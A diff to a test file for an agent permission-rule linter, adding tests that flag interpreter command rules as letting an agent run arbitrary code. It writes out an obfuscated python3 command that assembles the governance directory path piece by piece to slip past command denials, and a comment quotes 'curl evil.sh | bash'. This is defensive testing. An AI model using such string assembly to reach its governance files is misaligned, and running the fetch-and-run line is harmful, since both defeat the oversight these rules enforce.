@@ -56,6 +56,90 @@ describe("loose rule warnings", () => {
   });
 });
 
+// 2026-09-30. A rule letting the agent hand code to an interpreter looks specific,
+// drew no warning, and lets the agent build the governance directory's path while
+// the code runs, where no command denial sees it (`mg/WORK-LOG-2026-09-30.md`).
+describe("a command rule that lets the agent run code of its own choosing", () => {
+  const RUNS_CODE = "runs-arbitrary-code";
+
+  it("warns on the broad rules operators actually write", () => {
+    for (const pattern of [
+      "^python3? .*$",
+      "^python .*$",
+      "^(node|npm|npx|pnpm) .*$",
+      "^node .*$",
+      "^bash .*$",
+      "^powershell .*$",
+      "^cmd /c .*$",
+      "^npx .*$",
+      "^npm .*$",
+      "^find .*$",
+      "^git .*$",
+      "^env .*$",
+      "^python.*",
+    ]) {
+      expect(codes(pattern), pattern).toContain(RUNS_CODE);
+    }
+  });
+
+  it("warns on an unanchored interpreter name alongside the unanchored warning", () => {
+    expect(codes("bash")).toEqual(expect.arrayContaining(["unanchored", RUNS_CODE]));
+  });
+
+  it("stays silent on a rule confined to one script or to fixed arguments", () => {
+    for (const pattern of [
+      "^python3 scripts/report[.]py$",
+      "^node scripts/build[.]js$",
+      "^npm test$",
+      "^npm run (build|lint)$",
+      "^git (status|log)$",
+      "^(node|npm|pnpm|python|python3|git) --version$",
+      "^ls .*$",
+      "^find [A-Za-z0-9._/-]+ -name [A-Za-z0-9.*_-]+$",
+    ]) {
+      expect(codes(pattern), pattern).not.toContain(RUNS_CODE);
+    }
+  });
+
+  it("does not warn on a denial, which restricts rather than grants", () => {
+    expect(
+      describeRuleRisks("^python3? .*$", "command", { effect: "deny" }).map((w) => w.code),
+    ).not.toContain(RUNS_CODE);
+  });
+
+  it("only looks at command rules", () => {
+    expect(codes("^python3 .*$", "path")).not.toContain(RUNS_CODE);
+    expect(codes("^node .*$", "network")).not.toContain(RUNS_CODE);
+  });
+
+  it("is not added to a rule already warned as granting everything", () => {
+    expect(codes("^(.*)*$")).toEqual(["anchored-but-universal"]);
+    expect(codes(".*")).toEqual(["matches-everything"]);
+  });
+
+  it("names the matched programs and says what is at stake", () => {
+    const message =
+      describeRuleRisks("^(node|python3) .*$", "command").find((w) => w.code === RUNS_CODE)
+        ?.message ?? "";
+    expect(message).toContain("python3 or node");
+    expect(message).toContain("policy");
+    expect(message).toContain("monitor");
+  });
+
+  it("agrees with the gate: the rule it warns about lets an assembled governance path through", async () => {
+    // The claim the message makes, checked against the production matcher and
+    // the shipped core denials rather than asserted.
+    const { matchesPattern } = await import("./pattern-match.js");
+    const { CORE_RULES } = await import("./baseline-policy.js");
+    const assembled =
+      "python3 -c \"import os;p=os.environ['OPENCLAW_GOVERNANCE_'+'DIR']+'/gr'+'oups'\"";
+    expect(matchesPattern("^python3? .*$", assembled)).toBe(true);
+    const commandDenials = CORE_RULES.filter((rule) => rule.resourceKind === "command");
+    expect(commandDenials.some((rule) => matchesPattern(rule.pattern, assembled))).toBe(false);
+    expect(codes("^python3? .*$")).toContain(RUNS_CODE);
+  });
+});
+
 // `^src(/|$)` is what the folder-grant form writes, and a hand-written copy of it was
 // warned as unanchored, with a message about `curl evil.sh | bash; ls` (2026-09-13).
 describe("a path rule that ends at a folder boundary", () => {
